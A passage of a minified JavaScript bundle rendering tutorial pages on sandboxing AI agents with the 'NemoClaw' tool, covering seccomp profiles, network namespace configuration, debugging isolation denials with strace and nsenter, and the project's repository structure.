log, or trap each syscall based on its number and arguments. Once applied, the filter cannot be removed or weakened -- it persists for the lifetime of the process and is inherited by all child processes.",example:"A seccomp-bpf filter that allows read, write, mmap, open, close, and a handful of other syscalls needed for normal operation, while blocking mount, reboot, kexec_load, ptrace, and other dangerous syscalls that a sandboxed agent should never need.",seeAlso:["System Call","BPF","Sandboxing","Landlock"]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"NemoClaw's Default Seccomp Profile"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"NemoClaw ships with a default seccomp profile that blocks syscalls that sandboxed agents should never need. This default profile is based on Docker's default seccomp profile (which blocks approximately 44 of the 300+ syscalls on x86_64) but is further tightened for the agent use case. The default profile blocks:"}),e.jsxs("ul",{className:"list-disc list-inside space-y-3 text-gray-700 dark:text-gray-300",children:[e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Kernel module operations:"})," init_module, finit_module, delete_module -- loading kernel modules could compromise the entire host."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Mount operations:"})," mount, umount2, pivot_root -- manipulating the filesystem namespace is dangerous from within a sandbox."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Reboot and power:"})," reboot, kexec_load, kexec_file_load -- no agent should be able to reboot the host."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Namespace creation:"})," unshare, setns (with certain flags) -- creating new namespaces could be used to escape the sandbox."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Tracing:"})," ptrace, process_vm_readv, process_vm_writev -- debugging other processes could be used to inspect or manipulate processes outside the sandbox."]}),e.jsxs("li",{children:[e.jsx("span",{className:"font-semibold",children:"Raw I/O:"})," iopl, ioperm -- direct hardware I/O access bypasses all kernel protections."]})]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"When You Need a Custom Profile"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The default profile works for most agent use cases, but certain specialized agents may require syscalls that the default profile blocks. Conversely, you may want to further restrict the profile to block syscalls that the default allows but your specific agent does not need. Common scenarios requiring custom profiles include:"}),e.jsxs("ul",{className:"list-disc list-inside space-y-3 text-gray-700 dark:text-gray-300",children:[e.jsx("li",{children:"Agents that need to run containers or use container runtimes (may need unshare, clone3 with namespace flags)."}),e.jsx("li",{children:"Agents that perform performance profiling (may need perf_event_open)."}),e.jsx("li",{children:"Ultra-restrictive environments where you want to block even fork/execve to prevent the agent from spawning any subprocesses."})]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Analyzing Syscall Requirements"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Before writing a custom seccomp profile, you need to know which syscalls your agent actually uses. The strace tool is the standard approach for this analysis."}),e.jsx(t,{language:"bash",title:"Analyzing syscall usage with strace",children:`# Run the agent under strace and collect syscall statistics
strace -c -f -o /tmp/syscall-summary.txt nemoclaw run --blueprint my-agent \\
  --prompt "Perform a typical task"

# -c: count time, calls, and errors for each syscall
# -f: follow child processes (important -- agents spawn subprocesses)

cat /tmp/syscall-summary.txt
# Output shows a table of syscalls used, with call count and time

# For more detail, trace actual syscall arguments:
strace -f -e trace=network -o /tmp/network-syscalls.txt nemoclaw run --blueprint my-agent \\
  --prompt "Perform a typical task"

# Trace only specific syscall categories:
# -e trace=file       File-related syscalls
# -e trace=network    Network-related syscalls
# -e trace=process    Process management syscalls
# -e trace=memory     Memory management syscalls`}),e.jsx(t,{language:"bash",title:"Generating a minimal seccomp profile from strace output",children:`# Record all unique syscalls used during a representative workload
strace -f -o /tmp/raw-trace.txt nemoclaw run --blueprint my-agent \\
  --prompt "Perform a comprehensive task"

# Extract unique syscall names
grep -oP '^\\[pid \\d+\\] \\K\\w+' /tmp/raw-trace.txt | sort -u > /tmp/used-syscalls.txt

# Or use NemoClaw's built-in profiler
nemoclaw seccomp profile --blueprint my-agent \\
  --prompt "Perform a comprehensive task" \\
  --output my-seccomp-profile.json

# This runs the agent, records all syscalls, and generates a
# seccomp profile that allows only the observed syscalls plus
# a safety margin for uncommon code paths.`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Writing a Custom Seccomp Profile"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"NemoClaw uses the OCI/Docker seccomp profile JSON format, which is more human-readable than raw BPF bytecode. The profile specifies a default action and a list of syscalls with per-syscall actions."}),e.jsx(t,{language:"json",title:"Custom seccomp profile (seccomp-profile.json)",children:`{
  "defaultAction": "SCMP_ACT_ERRNO",
  "defaultErrnoRet": 1,
  "architectures": ["SCMP_ARCH_X86_64", "SCMP_ARCH_AARCH64"],
  "syscalls": [
    {
      "names": [
        "read", "write", "close", "fstat", "lstat", "stat",
        "poll", "lseek", "mmap", "mprotect", "munmap", "brk",
        "ioctl", "access", "pipe", "select", "sched_yield",
        "dup", "dup2", "nanosleep", "getpid", "socket",
        "connect", "sendto", "recvfrom", "sendmsg", "recvmsg",
        "bind", "listen", "accept", "getsockname", "getpeername",
        "clone", "fork", "execve", "exit", "wait4", "kill",
        "uname", "fcntl", "flock", "fsync", "fdatasync",
        "truncate", "ftruncate", "getdents", "getcwd", "chdir",
        "mkdir", "rmdir", "creat", "link", "unlink", "symlink",
        "readlink", "chmod", "chown", "umask", "gettimeofday",
        "getrlimit", "getrusage", "sysinfo", "times",
        "getuid", "getgid", "geteuid", "getegid",
        "setpgid", "getppid", "getpgrp",
        "rt_sigaction", "rt_sigprocmask", "rt_sigreturn",
        "pread64", "pwrite64", "readv", "writev",
        "openat", "mkdirat", "newfstatat", "unlinkat",
        "renameat2", "faccessat", "pipe2", "epoll_create1",
        "epoll_ctl", "epoll_wait", "eventfd2", "timerfd_create",
        "signalfd4", "accept4", "dup3", "getrandom",
        "memfd_create", "clone3", "close_range",
        "openat2", "pidfd_open", "futex", "set_robust_list",
        "get_robust_list", "epoll_pwait", "arch_prctl",
        "set_tid_address", "exit_group", "tgkill",
        "prlimit64", "sched_getaffinity", "madvise",
        "rseq", "clock_gettime", "clock_nanosleep"
      ],
      "action": "SCMP_ACT_ALLOW"
    },
    {
      "names": ["ptrace"],
      "action": "SCMP_ACT_LOG",
      "comment": "Log ptrace attempts for debugging but still deny"
    }
  ]
}`}),e.jsx(t,{language:"yaml",title:"Referencing the custom profile in a blueprint",children:`# blueprint.yaml
policies:
  seccomp:
    profile: "policies/seccomp-profile.json"
    # Or use a preset:
    # preset: "strict"    # NemoClaw's strict preset
    # preset: "default"   # NemoClaw's default preset
    # preset: "permissive" # Docker's default (less restrictive)`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Testing Seccomp Rules"}),e.jsx(t,{language:"bash",title:"Testing a custom seccomp profile",children:`# Dry-run: show which syscalls would be blocked/allowed
nemoclaw seccomp test --profile policies/seccomp-profile.json

# Run the agent with the custom profile and verbose seccomp logging
nemoclaw run --blueprint ./my-agent/ --seccomp-log \\
  --prompt "Perform a typical task"

# Check the seccomp audit log for denied syscalls
# (requires auditd or journald)
journalctl -k | grep SECCOMP
# Or:
dmesg | grep seccomp`}),e.jsx(s,{title:"Testing Is Critical",children:e.jsx("p",{children:"An overly restrictive seccomp profile will cause the agent to crash or malfunction in subtle ways. A missing syscall might cause a segfault, a library to fail initialization, or a subprocess to silently fail. Always test custom profiles with a comprehensive workload and check both the agent's output and the seccomp audit log for denied syscalls. When in doubt, use SCMP_ACT_LOG instead of SCMP_ACT_ERRNO during testing to identify syscalls that are needed without breaking the agent."})}),e.jsx(n,{title:"Seccomp Actions",headers:["Action","Behavior","Use Case"],rows:[["SCMP_ACT_ALLOW","Allow the syscall","Syscalls the agent needs"],["SCMP_ACT_ERRNO","Return an error to the caller","Block dangerous syscalls gracefully"],["SCMP_ACT_KILL_PROCESS","Kill the entire process","Critical security violations"],["SCMP_ACT_LOG","Allow but log to audit","Testing and monitoring"],["SCMP_ACT_TRAP","Send SIGSYS signal","Debugging and custom handlers"]]}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Custom seccomp profiles give you fine-grained control over the system call surface available to sandboxed agents. Combined with Landlock filesystem restrictions and network namespace isolation, seccomp-bpf completes the defense-in-depth security model that makes NemoClaw's sandbox robust against even sophisticated attacks. The next section covers advanced network namespace configuration for agents that need more complex networking setups."})]})}const U=Object.freeze(Object.defineProperty({__proto__:null,default:b},Symbol.toStringTag,{value:"Module"}));function w(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-white",children:"Advanced Network Namespace Configuration"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"NemoClaw's network isolation is built on Linux network namespaces -- each sandbox gets its own isolated network stack with its own interfaces, routing table, and iptables rules. In the standard configuration, this is transparent: NemoClaw creates a namespace, sets up a veth pair to connect the sandbox to the host, and configures iptables rules to enforce the network policy. For most use cases, this default configuration works without modification. However, advanced deployments sometimes require more complex network topologies: multiple namespaces for multi-agent orchestration, custom routing tables for traffic segmentation, or traffic shaping for rate limiting and bandwidth control."}),e.jsx(r,{term:"Network Namespace",definition:"A Linux kernel feature that provides an isolated copy of the network stack. Each network namespace has its own network interfaces, IP addresses, routing tables, iptables rules, and socket listings. Processes in different namespaces cannot communicate through the network unless explicitly connected (e.g., via a veth pair or bridge). Network namespaces are the foundation of container networking.",example:"A NemoClaw sandbox runs in its own network namespace with a single veth interface (eth0 inside the namespace, vethXXX on the host). The host-side iptables rules filter traffic based on the blueprint's network policy, allowing only whitelisted destinations.",seeAlso:["veth pair","iptables","Network Policy","Linux Namespaces"]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Default Network Topology"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Understanding the default topology is necessary before extending it. When NemoClaw creates a sandbox, the following network setup is established:"}),e.jsx(t,{language:"text",title:"Default NemoClaw network topology",children:`Host Network Namespace                    Sandbox Network Namespace
┌─────────────────────────┐              ┌─────────────────────────┐
│                         │              │                         │
│   eth0 (host NIC)       │              │   eth0 (sandbox NIC)    │
│   192.168.1.100         │              │   10.0.100.2/24         │
│                         │              │                         │
│   vethXXXX ─────────────┼──────────────┼── eth0 (veth peer)      │
│   10.0.100.1/24         │   veth pair  │   10.0.100.2/24         │
│                         │              │                         │
│   iptables rules:       │              │   default route:        │
│   - FORWARD chain       │              │   via 10.0.100.1        │
│   - per-sandbox rules   │              │                         │
│   - NAT for allowed     │              │   DNS: 10.0.100.1       │
│     destinations        │              │   (resolved by host)    │
│                         │              │                         │
└─────────────────────────┘              └─────────────────────────┘`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Multiple Namespaces for Multi-Agent Deployments"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"When running multiple NemoClaw agents that need to communicate with each other -- for example, in a multi-agent orchestration pattern where a coordinator agent delegates subtasks to specialist agents -- you need network connectivity between sandboxes. By default, each sandbox is completely isolated; there is no network path between them."}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"NemoClaw supports interconnecting sandboxes through a shared bridge network. This creates a virtual network switch that connects multiple sandbox namespaces while maintaining isolation from the host network and the internet."}),e.jsx(t,{language:"yaml",title:"Multi-agent network configuration",children:`# In the orchestrator blueprint's network policy
network:
  mode: "bridge"
  bridge_name: "nemoclaw-agents"
  subnet: "10.0.200.0/24"
  ip: "10.0.200.1"

  # Allow communication with other agents on the same bridge
  allow:
    - group: "inter-agent"
      rules:
        - host: "10.0.200.0/24"
          port: 8080
          description: "Communication with peer agents"

    - group: "llm"
      rules:
        - host: "integrate.api.nvidia.com"
          port: 443
          tls: required`}),e.jsx(t,{language:"bash",title:"Inspecting multi-agent network topology",children:`# List all NemoClaw bridge networks
nemoclaw network list

# Show the topology of a specific bridge
nemoclaw network inspect nemoclaw-agents
# Output:
# Bridge: nemoclaw-agents (10.0.200.0/24)
# Connected sandboxes:
#   - orchestrator (10.0.200.1)
#   - code-reviewer (10.0.200.2)
#   - test-runner (10.0.200.3)

# From the host, inspect the network namespace
ip netns list
# nemoclaw-sandbox-abc123
# nemoclaw-sandbox-def456
# nemoclaw-sandbox-ghi789

# Inspect interfaces inside a namespace
ip netns exec nemoclaw-sandbox-abc123 ip addr show`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Veth Pairs and Custom Routing"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"A veth (virtual Ethernet) pair is a pair of network interfaces connected like a pipe: packets sent on one end appear on the other. NemoClaw creates one veth pair per sandbox, with one end in the sandbox namespace and the other on the host (or on a bridge). For advanced topologies, you can configure additional veth pairs to create direct connections between specific sandboxes or to segment traffic."}),e.jsx(t,{language:"yaml",title:"Custom routing table configuration",children:`# Advanced network configuration with custom routing
network:
  mode: "custom"
  interfaces:
    - name: "eth0"
      type: "veth"
      peer: "host"
      ip: "10.0.100.2/24"
      routes:
        # Default route through the host for allowed internet traffic
        - destination: "0.0.0.0/0"
          gateway: "10.0.100.1"
          table: "main"

    - name: "eth1"
      type: "veth"
      peer: "bridge:nemoclaw-agents"
      ip: "10.0.200.5/24"
      routes:
        # Route inter-agent traffic through the bridge
        - destination: "10.0.200.0/24"
          gateway: "direct"
          table: "main"

  # Policy-based routing: route LLM traffic through a specific interface
  rules:
    - match:
        destination: "integrate.api.nvidia.com"
      action:
        table: "main"
        interface: "eth0"`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Traffic Shaping and Rate Limiting"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Traffic shaping controls the rate at which a sandbox can send and receive network traffic. This is useful for preventing a single agent from consuming all available bandwidth, for simulating bandwidth-constrained environments during testing, or for implementing rate limits that complement the API-level rate limits of external services."}),e.jsx(t,{language:"yaml",title:"Traffic shaping configuration",children:`# Network policy with traffic shaping
network:
  traffic_shaping:
    # Limit total bandwidth
    egress:
      rate: "10mbit"          # Maximum outbound bandwidth
      burst: "1mbit"          # Burst allowance
    ingress:
      rate: "50mbit"          # Maximum inbound bandwidth
      burst: "5mbit"

    # Per-destination rate limiting
    per_host_limits:
      - host: "api.github.com"
        rate: "5mbit"
        connections_per_second: 10   # Max new connections per second

      - host: "integrate.api.nvidia.com"
        rate: "10mbit"
        connections_per_second: 50`}),e.jsx(a,{type:"info",title:"Traffic Shaping Implementation",children:e.jsx("p",{children:"NemoClaw implements traffic shaping using Linux tc (traffic control) with the HTB (Hierarchical Token Bucket) queuing discipline. The configuration in the blueprint is translated into tc commands applied to the veth interface on the host side of the connection. This means traffic shaping is enforced by the host, not by the sandbox -- the sandboxed process cannot bypass or modify the shaping rules."})}),e.jsx(s,{title:"Performance Impact of Complex Network Topologies",children:e.jsx("p",{children:"Each additional veth pair, bridge, and iptables rule adds a small amount of latency and CPU overhead to network operations. For most NemoClaw deployments, this overhead is negligible (microseconds per packet). However, in high-throughput multi-agent deployments with heavy inter-agent communication, the cumulative overhead can become measurable. Profile your network performance if you are building complex topologies with many interconnected sandboxes."})}),e.jsx(n,{title:"Network Configuration Modes",headers:["Mode","Topology","Use Case","Complexity"],rows:[["default","Single veth to host","Standard single-agent sandbox","None -- automatic"],["bridge","Veth pairs connected via bridge","Multi-agent communication","Low -- YAML config"],["custom","Multiple interfaces, custom routes","Complex multi-tier architectures","High -- requires networking knowledge"],["none","No network access at all","Fully offline agents","None -- automatic"]]}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Advanced network configuration gives you the flexibility to build sophisticated multi-agent deployments with controlled communication channels, traffic isolation, and bandwidth management. In the next section, we cover how to debug issues when sandbox isolation does not behave as expected -- using strace, nsenter, and other tools to diagnose Landlock, seccomp, and network problems from within and outside the sandbox."})]})}const G=Object.freeze(Object.defineProperty({__proto__:null,default:w},Symbol.toStringTag,{value:"Module"}));function v(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-white",children:"Debugging Sandbox Isolation Issues"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:`When a sandboxed NemoClaw agent fails to perform an expected operation, the cause is often one of the sandbox isolation mechanisms -- Landlock denying a filesystem operation, seccomp blocking a syscall, or the network namespace preventing a connection. These failures are by design, but when the denied operation is something the agent legitimately needs, you have a debugging problem. The error messages from the agent's perspective are typically generic ("Permission denied", "Connection refused", "Operation not permitted") and do not indicate which isolation layer caused the denial. This section covers the tools and techniques for diagnosing exactly what is being blocked and why.`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"The Debugging Mindset for Sandboxes"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Sandbox debugging is different from regular application debugging because the denial happens at the kernel level, below the application. The application sees a generic error code (EACCES, EPERM, ECONNREFUSED) but has no visibility into which security mechanism produced it. Your debugging workflow should work through the isolation layers systematically:"}),e.jsxs("ol",{className:"list-decimal list-inside space-y-3 text-gray-700 dark:text-gray-300",children:[e.jsx("li",{children:"Identify the failed operation (file access, network connection, syscall)."}),e.jsx("li",{children:"Check the NemoClaw TUI logs for blocked operations."}),e.jsx("li",{children:"Check kernel audit logs for Landlock and seccomp denials."}),e.jsx("li",{children:"Use strace to observe the exact syscall and its return code."}),e.jsx("li",{children:"Use nsenter to inspect the namespace configuration."}),e.jsx("li",{children:"Verify the policy configuration matches your intent."})]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Using strace Inside the Sandbox"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"strace is the most powerful tool for diagnosing sandbox issues because it shows you exactly which system call failed and what error code was returned. However, using strace inside a sandbox requires that the seccomp profile allows the ptrace syscall (which is blocked by default). NemoClaw provides a debug mode that relaxes the seccomp profile to permit strace."}),e.jsx(t,{language:"bash",title:"Running strace inside a NemoClaw sandbox",children:`# Start the sandbox in debug mode (allows ptrace for strace)
nemoclaw run --blueprint my-agent --debug \\
  --prompt "Perform the failing task"

# The --debug flag:
# 1. Enables ptrace in the seccomp profile
# 2. Increases log verbosity
# 3. Logs all blocked operations with their source layer

# Alternatively, attach strace to a running sandbox
# First, find the sandbox PID
nemoclaw ps
# PID     BLUEPRINT       STATUS    UPTIME
# 12345   my-agent        running   5m

# Then use nemoclaw's built-in strace wrapper
nemoclaw debug strace 12345 --follow-forks
# This enters the sandbox's namespaces and runs strace on the agent process

# Filter strace output for relevant syscalls
nemoclaw debug strace 12345 -e trace=open,openat,access,connect,bind 2>&1 | grep EACCES`}),e.jsx(i,{number:1,title:"Diagnosing a filesystem access denial",children:e.jsx(t,{language:"bash",children:`# The agent reports "Permission denied" when trying to read a file

# Step 1: Check what the agent is trying to access
nemoclaw debug strace 12345 -e trace=openat,access 2>&1 | grep -i deny

# Example output:
# openat(AT_FDCWD, "/workspace/config/.env", O_RDONLY) = -1 EACCES (Permission denied)

# Step 2: Check if Landlock is the cause
# Look in kernel audit log
dmesg | grep -i landlock
# Or check journald
journalctl -k --since "5 minutes ago" | grep -i landlock

# Step 3: Check the filesystem policy
nemoclaw blueprint inspect my-agent --show-policies | grep -A5 filesystem
# Reveals that /workspace/config is not in the allowed paths

# Step 4: Fix by adding the path to the filesystem policy
# Edit policies/filesystem.yaml to add:
#   - path: "/workspace/config"
#     access: read
#     recursive: true`})}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Using nsenter to Inspect Namespaces"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"nsenter allows you to enter a running sandbox's namespaces from the host, giving you a shell that sees the same network configuration, mount points, and process list as the sandboxed agent. This is invaluable for debugging network issues because you can run standard networking tools from within the sandbox's namespace."}),e.jsx(t,{language:"bash",title:"Entering a sandbox namespace for debugging",children:`# Find the sandbox's init PID
SANDBOX_PID=$(nemoclaw ps --format json | jq -r '.[] | select(.blueprint=="my-agent") | .pid')

# Enter all namespaces of the sandbox
sudo nsenter --target $SANDBOX_PID --all

# Now you are inside the sandbox's namespaces.
# Check network configuration:
ip addr show         # See the sandbox's network interfaces
ip route show        # See the routing table
cat /etc/resolv.conf # See DNS configuration

# Test connectivity to an endpoint
curl -v https://api.github.com/status
# If this fails, the network policy is blocking it

# Check iptables rules (from the host side, not inside nsenter)
# Exit nsenter first, then:
sudo iptables -L -v -n --line-numbers | grep $SANDBOX_PID

# Or use NemoClaw's network debug command
nemoclaw debug network 12345
# Shows: interfaces, routes, iptables rules, DNS config, active connections`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Checking Landlock Status"}),e.jsx(t,{language:"bash",title:"Inspecting Landlock restrictions on a process",children:`# Check if Landlock is active for a process
cat /proc/$SANDBOX_PID/attr/current 2>/dev/null

# Check the Landlock ABI version available
cat /sys/kernel/security/landlock/abi-version

# NemoClaw provides a detailed Landlock report
nemoclaw debug landlock 12345
# Output:
# Landlock status: ACTIVE
# Ruleset layers: 2
# Layer 1 (base):
#   Handled access: READ_FILE, WRITE_FILE, READ_DIR, MAKE_REG, ...
#   Rules: 12 paths
# Layer 2 (blueprint):
#   Handled access: READ_FILE, READ_DIR
#   Rules: 3 paths
#
# Effective readable paths:
#   /workspace/src (recursive)
#   /usr/lib (recursive)
#   /tmp (recursive)
#
# Effective writable paths:
#   /workspace/output (recursive)
#   /tmp (recursive)

# Test a specific path access
nemoclaw debug landlock 12345 --test-path /workspace/config/.env --access read
# Output: DENIED (not covered by any Landlock rule)`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Diagnosing Seccomp Violations"}),e.jsx(t,{language:"bash",title:"Finding seccomp-blocked syscalls",children:`# Seccomp violations are logged to the kernel audit log
# when the profile uses SCMP_ACT_LOG or SCMP_ACT_ERRNO with audit

# Check for recent seccomp events
dmesg | grep -i seccomp
# Example output:
# audit: type=1326 audit(1234567890.123:456): auid=1000 uid=1000
#   gid=1000 ses=1 pid=12345 comm="python3" exe="/usr/bin/python3"
#   sig=0 arch=c000003e syscall=101 compat=0 ip=0x7f... code=0x50000

# Decode the syscall number
# syscall=101 on x86_64 is ptrace
python3 -c "import os; print(os.strerror(1))"  # EPERM

# Use ausearch for structured audit log queries
sudo ausearch -m SECCOMP --start recent
# Shows structured seccomp audit events with process, syscall, and result

# NemoClaw's seccomp debug command decodes everything for you
nemoclaw debug seccomp 12345
# Output:
# Seccomp profile: custom (policies/seccomp-profile.json)
# Recent denials:
#   2026-03-27 14:30:15  ptrace (syscall 101)  by python3  -> ERRNO
#   2026-03-27 14:30:16  clone3 (syscall 435)  by bash     -> ERRNO
#
# Suggestion: If these syscalls are needed, add them to your
# custom seccomp profile in the SCMP_ACT_ALLOW list.`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Network Connectivity Troubleshooting"}),e.jsx(i,{number:2,title:"Systematic network debugging",children:e.jsx(t,{language:"bash",children:`# Step 1: Check if DNS resolution works inside the sandbox
nemoclaw debug exec 12345 -- nslookup api.github.com
# If this fails: DNS is not configured or blocked

# Step 2: Check if the destination IP is reachable
nemoclaw debug exec 12345 -- ping -c 1 -W 2 140.82.121.6
# If this fails: routing or iptables is blocking

# Step 3: Check if the specific port is reachable
nemoclaw debug exec 12345 -- nc -zv api.github.com 443
# If this fails: iptables is blocking the port

# Step 4: Check the actual iptables rules for this sandbox
nemoclaw debug network 12345 --show-rules
# Shows the iptables chain specific to this sandbox

# Step 5: Check if TLS works
nemoclaw debug exec 12345 -- openssl s_client -connect api.github.com:443 -brief
# If connection succeeds but agent fails: likely a certificate or
# proxy issue rather than a network policy issue

# Common issues:
# - DNS resolution blocked (add DNS server to network config)
# - Wrong port in policy (443 vs 8443)
# - TLS required but endpoint is HTTP
# - Domain resolves to a different IP than expected (CDN/load balancer)
# - Timeout too short for slow connections`})}),e.jsx(s,{title:"Debug Mode Weakens Security",children:e.jsx("p",{children:"The --debug flag relaxes seccomp restrictions to allow debugging tools like strace and gdb. Never use debug mode in production. It should only be used during development and testing to diagnose sandbox configuration issues. Once you have identified the problem, fix the policy configuration and test again without debug mode to confirm the fix works with full security enforced."})}),e.jsx(a,{type:"info",title:"The NemoClaw Debug Dashboard",children:e.jsx("p",{children:"NemoClaw's TUI includes a debug panel (toggle with Ctrl+D) that shows real-time information about blocked operations across all isolation layers. When an operation is denied, the debug panel shows which layer (Landlock, seccomp, or network) blocked it, the specific rule that triggered the denial, and a suggestion for how to modify the policy if the operation should be allowed. This is often the fastest path to diagnosis without needing to drop to command-line tools."})}),e.jsx(o,{title:"Debug a Broken Sandbox Configuration",difficulty:"advanced",children:e.jsxs("ol",{className:"list-decimal list-inside space-y-2 mt-2",children:[e.jsx("li",{children:"Create a blueprint with intentionally restrictive policies (deny all network, minimal filesystem)."}),e.jsx("li",{children:"Run an agent with a task that requires network and filesystem access."}),e.jsx("li",{children:"Observe the failures in the TUI debug panel."}),e.jsx("li",{children:"Use strace (via --debug mode) to identify the exact blocked operations."}),e.jsx("li",{children:"Use nsenter to inspect the namespace configuration."}),e.jsx("li",{children:"Iteratively fix the policies until the agent can complete its task."}),e.jsx("li",{children:"Remove --debug and confirm everything works with full security enforced."})]})}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Effective debugging of sandbox isolation requires understanding all three security layers (Landlock, seccomp, network namespaces) and knowing which tools to use for each. With the techniques in this section, you can diagnose any sandbox issue and determine whether to fix the policy (if the agent legitimately needs the access) or fix the agent (if it is requesting access it should not need)."})]})}const F=Object.freeze(Object.defineProperty({__proto__:null,default:v},Symbol.toStringTag,{value:"Module"}));function k(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-white",children:"NemoClaw Repository Structure"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"NemoClaw is an open-source project hosted on GitHub. Understanding the repository structure is the first step toward contributing -- whether you are fixing a bug, adding a feature, improving documentation, or reviewing pull requests. This section maps out the key directories, explains the build system, and covers the development prerequisites you need to get a working development environment."}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-100 mt-8",children:"Repository Overview"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"NemoClaw is a monorepo containing multiple components. The main binary (the NemoClaw CLI), the sandbox runtime, the TUI interface, the policy engine, built-in blueprints, and the test suite all live in a single repository. This monorepo approach ensures that all components are versioned together and that cross-component changes can be made in a single pull request."}),e.jsx(t,{language:"text",title:"Top-level directory structure",children:`nemoclaw/
├── .github/                    # GitHub Actions CI/CD workflows
│   ├── workflows/
│   │   ├── ci.yml              # Main CI pipeline (lint, test, build)
│   │   ├── release.yml         # Release automation
│   │   └── security-scan.yml   # Automated security scanning
│   └── ISSUE_TEMPLATE/
│       ├── bug_report.md
│       └── feature_request.md
│
├── cmd/                        # Entry points for CLI binaries
│   └── nemoclaw/
│       └── main.go             # Main entry point
│
├── internal/                   # Internal packages (not importable externally)
│   ├── agent/                  # Agent runtime and lifecycle management
│   │   ├── agent.go
│   │   ├── session.go
│   │   └── tools.go
│   ├── blueprint/              # Blueprint loading, validation, resolution
│   │   ├── loader.go
│   │   ├── resolver.go
│   │   ├── schema.go
│   │   └── validator.go
│   ├── llm/                    # LLM client abstraction layer
│   │   ├── client.go
│   │   ├── openai.go           # OpenAI-compatible API client
│   │   └── streaming.go
│   ├── policy/                 # Policy engine (network, filesystem, resources)
│   │   ├── engine.go
│   │   ├── network.go
│   │   ├── filesystem.go
│   │   ├── resources.go
│   │   └── parser.go
│   ├── sandbox/                # Sandbox creation and management
│   │   ├── sandbox.go
│   │   ├── landlock.go         # Landlock ruleset management
│   │   ├── seccomp.go          # Seccomp profile loading and application
│   │   ├── netns.go            # Network namespace setup
│   │   └── cgroup.go           # Cgroup resource limits
│   ├── tui/                    # Terminal user interface
│   │   ├── app.go
│   │   ├── views/
│   │   ├── components/
│   │   └── styles.go
│   └── mcp/                    # MCP (Model Context Protocol) integration
│       ├── server.go
│       ├── transport.go
│       └── tools.go
│
├── pkg/                        # Public packages (importable by other projects)
│   ├── config/                 # Configuration types and defaults
│   ├── types/                  # Shared type definitions
│   └── version/                # Version information
│
├── blueprints/                 # Built-in blueprints
│   ├── default/
│   │   └── blueprint.yaml
│   ├── coding-agent/
│   │   ├── blueprint.yaml
│   │   └── system-prompt.md
│   └── research-agent/
│       ├── blueprint.yaml
│       └── system-prompt.md
│
├── seccomp/                    # Seccomp profile definitions
│   ├── default.json
│   ├── strict.json
│   └── permissive.json
│
├── tests/                      # Integration and end-to-end tests
│   ├── integration/
│   ├── e2e/
│   └── fixtures/
│
├── docs/                       # Developer documentation
│   ├── architecture.md
│   ├── contributing.md
│   └── security-model.md
│
├── scripts/                    # Build and development scripts
│   ├── build.sh
│   ├── test.sh
│   ├── lint.sh
│   └── release.sh
│
├── go.mod                      # Go module definition
├── go.sum                      # Go dependency checksums
├── Makefile                    # Build targets
├── Dockerfile                  # Container build
├── LICENSE                     # Apache 2.0
